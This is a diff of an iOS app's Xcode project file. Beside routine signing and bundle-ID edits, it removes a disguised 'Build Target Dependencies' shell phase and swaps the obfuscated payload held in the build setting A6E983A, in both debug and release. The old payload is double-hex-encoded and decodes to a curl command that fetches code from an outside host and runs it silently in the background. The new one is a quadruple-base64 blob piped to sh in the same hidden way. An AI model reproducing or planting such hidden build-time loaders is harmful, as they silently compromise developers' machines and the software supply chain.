@@ -395,7 +395,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
 			buildPhases = (
-				140DA5CC84464E87A8A389E6 /* Build Target Dependencies */,
 				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
 				73F59DC62EAF637A00A68B13 /* Sources */,
 				73F59DC72EAF637A00A68B13 /* Frameworks */,
@@ -458,25 +457,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		140DA5CC84464E87A8A389E6 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -613,16 +593,14 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373536653639373337393733363336313734326537323735326636310a323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREphUm1oRFlURnJlVlZ1VmxwWFJVb3pXV3RrVm1SWFRuVldXRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = leaploan/leaploan.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = leaploan/Info.plist;
@@ -643,10 +621,9 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = test.moxige.three;
+				PRODUCT_BUNDLE_IDENTIFIER = ll.leap.loan;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = moxigethreeprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -665,16 +642,14 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373536653639373337393733363336313734326537323735326636310a323932323230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREphUm1oRFlURnJlVlZ1VmxwWFJVb3pXV3RrVm1SWFRuVldXRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = leaploan/leaploan.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = leaploan/Info.plist;
@@ -695,10 +670,9 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = test.moxige.three;
+				PRODUCT_BUNDLE_IDENTIFIER = ll.leap.loan;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = moxigethreeprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
